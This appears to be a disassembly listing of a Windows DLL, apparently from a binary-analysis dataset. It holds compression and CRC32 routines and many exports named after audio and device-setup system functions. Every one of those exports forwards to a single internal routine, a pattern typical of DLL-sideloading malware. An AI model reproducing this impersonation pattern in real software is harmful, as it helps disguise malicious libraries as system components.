mov [ rdx + rcx ] al
mov eax [ rbx + 0x1714 ]
add [ rbx + 0x28 ] 0x1
mov ecx 0x10
sub cl al
shr r8w cl
add eax 0xfffffff3
mov [ rbx + 0x1714 ] eax
mov [ rbx + 0x1710 ] r8w
jmp r-xdata
mov ecx [ rbx + 0x1714 ]
cmp ecx 0xd
jle r-xdata
mov rcx rbx
call sub_10013900
mov rdi [ rsp + 0x48 ]
mov rbp [ rsp + 0x38 ]
test esi esi
mov rsi [ rsp + 0x40 ]
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov rcx rbx
call sub_10014c90
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rbx
call sub_100146a0
lea eax [ rsi + 0x4 ]
shl ax cl
or [ rbx + 0x1710 ] ax
lea eax [ rcx + 0x3 ]
mov [ rbx + 0x1714 ] eax
mov edx [ rbx + 0x28 ]
lea r8d [ rsi + 0x4 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1710 ] ax
movzx eax [ rbx + 0x1710 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
movzx eax [ rbx + 0x1711 ]
mov edx [ rbx + 0x28 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov eax [ rbx + 0x1714 ]
add [ rbx + 0x28 ] 0x1
mov ecx 0x10
sub cl al
shr r8w cl
add eax 0xfffffff3
mov [ rbx + 0x1714 ] eax
mov [ rbx + 0x1710 ] r8w
jmp r-xdata
mov r8d [ rbx + 0xb60 ]
mov edx [ rbx + 0xb48 ]
add r9d 0x1
add r8d 0x1
add edx 0x1
mov rcx rbx
call sub_10014400
lea r8 [ rbx + 0x9b0 ]
lea rdx [ rbx + 0xbc ]
mov rcx rbx
call sub_100146a0
jmp r-xdata
sub_10015750
test r8d r8d
mov [ rsp + 0x10 ] rbx
mov r10d ecx
mov [ rsp + 0x18 ] rsi
mov ebx r8d
mov r11 rdx
not r10d
lea rsi [ r--data ]
je r-xdata
cmp ebx 0x20
jb r-xdata
test r11b 0x3
je r-xdata
cmp ebx 0x4
jb r-xdata
mov [ rsp + 0x20 ] rdi
mov edi ebx
shr rdi 0x5
nop
movzx ecx [ r11 ]
mov eax r10d
add r11 0x1
xor cl r10b
shr eax 0x8
movzx edx cl
mov r10d [ rsi + rdx * 4 ]
xor r10d eax
add ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov r9d ebx
shr r9 0x2
nop
nop
xor r10d [ r11 ]
mov eax r10d
shr rax 0x10
movzx edx al
mov eax r10d
mov r8d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov eax r10d
xor r8d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r8d [ rsi + rax * 4 ]
movzx eax r10b
xor r8d [ rsi + rax * 4 + 0xc00 ]
xor r8d [ r11 + 0x4 ]
mov r9d r8d
mov eax r8d
shr rax 0x10
movzx edx al
mov eax r8d
mov r8d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov rax r9
xor r8d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r8d [ rsi + rax * 4 ]
movzx eax r9b
xor r8d [ rsi + rax * 4 + 0xc00 ]
xor r8d [ r11 + 0x8 ]
mov r9d r8d
mov eax r8d
shr rax 0x10
movzx edx al
mov eax r8d
mov r8d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov rax r9
xor r8d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r8d [ rsi + rax * 4 ]
movzx eax r9b
xor r8d [ rsi + rax * 4 + 0xc00 ]
xor r8d [ r11 + 0xc ]
mov r9d r8d
mov eax r8d
shr rax 0x10
movzx edx al
mov eax r8d
mov r8d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov rax r9
xor r8d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r8d [ rsi + rax * 4 ]
movzx eax r9b
xor r8d [ rsi + rax * 4 + 0xc00 ]
xor r8d [ r11 + 0x10 ]
mov r9d r8d
mov eax r8d
shr rax 0x10
movzx edx al
mov eax r8d
mov r8d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov rax r9
xor r8d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r8d [ rsi + rax * 4 ]
movzx eax r9b
xor r8d [ rsi + rax * 4 + 0xc00 ]
xor r8d [ r11 + 0x14 ]
mov eax r8d
mov r9d r8d
shr rax 0x10
movzx edx al
mov eax r8d
shr rax 0x8
mov r8d [ rsi + rdx * 4 + 0x400 ]
movzx ecx al
mov rax r9
xor r8d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
add r11 0x20
xor r8d [ rsi + rax * 4 ]
movzx eax r9b
add ebx 0xffffffe0
xor r8d [ rsi + rax * 4 + 0xc00 ]
xor r8d [ r11 - 0x8 ]
mov r9d r8d
mov eax r8d
shr rax 0x10
movzx edx al
mov eax r8d
mov r8d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov rax r9
xor r8d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r8d [ rsi + rax * 4 ]
movzx eax r9b
xor r8d [ rsi + rax * 4 + 0xc00 ]
xor r8d [ r11 - 0x4 ]
mov eax r8d
shr rax 0x10
movzx edx al
mov eax r8d
mov r10d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov eax r8d
xor r10d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r10d [ rsi + rax * 4 ]
movzx eax r8b
xor r10d [ rsi + rax * 4 + 0xc00 ]
sub rdi 0x1
jne r-xdata
mov rdi [ rsp + 0x20 ]
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
not r10d
mov eax r10d
retn
movzx ecx [ r11 ]
mov eax r10d
add r11 0x1
xor cl r10b
shr eax 0x8
movzx edx cl
mov r10d [ rsi + rdx * 4 ]
xor r10d eax
add ebx 0xffffffff
jne r-xdata
xor r10d [ r11 ]
add r11 0x4
add ebx 0xfffffffc
mov r8d r10d
mov eax r10d
shr rax 0x10
movzx edx al
mov eax r10d
mov r10d [ rsi + rdx * 4 + 0x400 ]
shr rax 0x8
movzx ecx al
mov rax r8
xor r10d [ rsi + rcx * 4 + 0x800 ]
shr rax 0x18
xor r10d [ rsi + rax * 4 ]
movzx eax r8b
xor r10d [ rsi + rax * 4 + 0xc00 ]
sub r9 0x1
jne r-xdata
sub_10015ac0
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_100010b0
cmp dl 0x10
je r-xdata
mov [ rcx + 0xac ] dl
retn
cmp dl 0x20
je r-xdata
cmp dl 0x40
je r-xdata
mov [ rcx + 0xac ] 0x10
retn
sub_100010d0
mov [ rcx + 0x38 ] rdx
retn
sub_10001770
mov rax [ rcx + 0x20 ]
cmp rax [ rcx + 0x28 ]
jae r-xdata
mov eax 0xffffffff
retn
movzx edx [ rax ]
add rax 0x1
mov [ rcx + 0x20 ] rax
mov eax edx
retn
sub_10001790
xor eax eax
retn
sub_100017a0
lea rax [ sub_10001770 ]
mov [ rcx + 0x20 ] rdx
mov [ rcx + 0x8 ] 0x0
mov [ rcx ] rax
lea rax [ rdx + r8 ]
mov [ rcx + 0x9 ] 0x0
mov [ rcx + 0x18 ] 0x0
mov [ rcx + 0x30 ] 0x0
mov [ rcx + 0x28 ] rax
retn
sub_10004a30
sub rsp 0x28
mov [ rcx + 0x28 ] 0x1
mov rcx [ rcx + 0x70 ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov edx 0x13880
call [ WaitForSingleObject@IAT ]
sub_10004b10
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x40 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x38 ]
add rsp 0x20
pop rbx
jmp [ SetEvent@IAT ]
call [ CloseHandle@IAT ]
mov [ rbx + 0x40 ] 0x0
sub_10005100
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call ??3@YAXPEAX@Z
add rsp 0x20
pop rbp
retn
sub_10005a17
and [ rcx ] ah
and ah [ rbx ]
int3
sub_10005a20
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x60 ]
call ??3@YAXPEAX@Z
add rsp 0x20
pop rbp
retn
sub_10005a40
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x60 ]
call ??3@YAXPEAX@Z
add rsp 0x20
pop rbp
retn
sub_10005a60
push rbx
sub rsp 0x20
mov rbx rcx
mov r8 rcx
lea rcx [ sub_10005210 ]
xor edx edx
call [ _beginthread@IAT ]
mov ecx 0x32
mov [ rbx + 0x70 ] rax
add rsp 0x20
pop rbx
jmp [ Sleep@IAT ]
sub_10005f80
xor eax eax
mov [ rcx + 0x10 ] edx
mov [ rcx + 0x14 ] r8w
mov [ rcx + 0x18 ] eax
mov [ rcx + 0x20 ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x4 ] eax
mov [ rcx ] eax
mov [ rcx + 0x28 ] r9
mov rax rcx
retn
sub_10006240
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] 0x1
mov rcx [ rcx + 0x20 ]
call [ rw-data ]
mov [ rbx + 0x20 ] 0x0
add rsp 0x20
pop rbx
retn
sub_100062c0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_10006270
mov rcx [ rbx + 0x20 ]
test rcx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
call [ rw-data ]
maintest
sub rsp 0x28
test r8 r8
je r-xdata
mov ecx 0x1
call sub_10007950
nop
nop
cmp [ r8 ] 0x2d
je r-xdata
mov ecx 0x2710
call [ Sleep@IAT ]
jmp r-xdata
sub_10007ae0
retn 0x0
sub_10007d20
xor eax eax
nop
nop
nop
nop
mov [ rcx ] eax
add eax 0x1
mov [ rcx + 0x4 ] 0x20000000
add rcx 0x8
cmp eax 0x8
jl r-xdata
retn
sub_10007d50
xor r9d r9d
mov rax r9
movsxd rax r9d
mov [ rcx + rax * 8 + 0x4 ] r8d
retn
add rax 0x1
add r9d 0x1
cmp rax 0x8
jl r-xdata
cmp [ rcx + rax * 8 ] edx
je r-xdata
retn
UpdateUIfontsDueToDPIchange
xor ecx ecx
jmp sub_10007950
mciSendCommandA
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
SendDriverMessage
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
OpenDriver
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
CloseDriver
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
waveOutGetDevCapsW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
waveOutGetNumDevs
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
waveInGetDevCapsW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
waveInGetNumDevs
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
waveInOpen
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
waveOutOpen
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerMessage
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerOpen
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
PlaySoundW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerClose
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerGetLineControlsW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerGetLineInfoW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerSetControlDetails
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerGetControlDetailsW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
mixerGetID
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
waveOutMessage
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
CM_Is_Dock_Station_Present
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
CM_Request_Eject_PC
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
CM_Get_Child
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
SetupDiEnumDeviceInterfaces
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
SetupDiDestroyDeviceInfoList
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
SetupDiGetDeviceInterfaceDetailW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
SetupDiGetClassDevsW
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
SetupDiOpenDevRegKey
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
SetupCloseFileQueue
sub rsp 0x28
mov ecx 0x1
call sub_10007950
xor eax eax
add rsp 0x28
retn
j_sub_100042d0
jmp sub_100042d0
sub_1000c890
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x60 ]
call ??3@YAXPEAX@Z
add rsp 0x20
pop rbp
retn
sub_1000cec0
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov rcx [ rcx + 0x40 ]
call ??3@YAXPEAX@Z
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_1000c980
sub_1000d8f0
lea rax [ r--data ]
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x20 ] 0x1
mov [ rcx ] rax
xor eax eax
mov [ rcx + 0x28 ] rax
mov [ rcx + 0x30 ] rax
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x18 ] rax
mov rax rcx
retn
j_sub_1001022c
jmp sub_1001022c
j_sub_100102a6
jmp sub_100102a6
__C_specific_handler
jmp [ __C_specific_handler@IAT ]
memset
jmp [ memset@IAT ]
??2@YAPEAX_K@Z
jmp [ operator new@IAT ]
sub_10010a60
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_10011010
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
memcpy
jmp [ memcpy@IAT ]
__CxxFrameHandler3
jmp [ __CxxFrameHandler3@IAT ]
memcmp
jmp [ memcmp@IAT ]
sub_10010f70
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx rcx
mov [ rbp + 0x28 ] rcx
mov rax [ rcx ]
mov ecx [ rax ]
mov [ rbp + 0x24 ] ecx
call __CppXcptFilter
add rsp 0x20
pop rbp
retn
sub_10010fa0
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rw-data ] 0xffffffff
add rsp 0x20
pop rbp
retn
sub_100112d0
lea rcx [ rw-data ]
jmp __clean_type_info_names_internal
sub_10011390
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x8
call _unlock
add rsp 0x20
pop rbp
retn
sub_100113b0
sub rsp 0x28
call sub_100112e0
neg rax
sbb eax eax
neg eax
sub eax 0x1
add rsp 0x28
retn
sub_10011470
xor eax eax
cmp [ rcx ] 0x5a4d
jne r-xdata
retn 0x0
movsxd rdx [ rcx + 0x3c ]
cmp [ rdx + rcx ] 0x4550
jne r-xdata
cmp [ rdx + rcx + 0x18 ] 0x20b
sete al
sub_10011530
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
_amsg_exit
jmp [ _amsg_exit@IAT ]
__CppXcptFilter
jmp [ __CppXcptFilter@IAT ]
__crt_debugger_hook
jmp [ __crt_debugger_hook@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
?_type_info_dtor_internal_method@type_info@@QEAAXXZ
jmp [ type_info::_type_info_dtor_internal_method@IAT ]
__clean_type_info_names_internal
jmp [ __clean_type_info_names_internal@IAT ]
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
sub_100135b0
sub rsp 0x48
mov [ rsp + 0x38 ] r9d
mov [ rsp + 0x30 ] r8
mov r9d 0xf
lea r8d [ r9 - 0x7 ]
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x8
call sub_10013310
add rsp 0x48
retn
sub_10015a70
test rdx rdx
jne r-xdata
jmp sub_10015750
xor eax eax
retn
sub_10015a80
imul edx r8d
mov ecx edx
jmp [ malloc@IAT ]
sub_10015a90
mov rcx rdx
jmp [ free@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
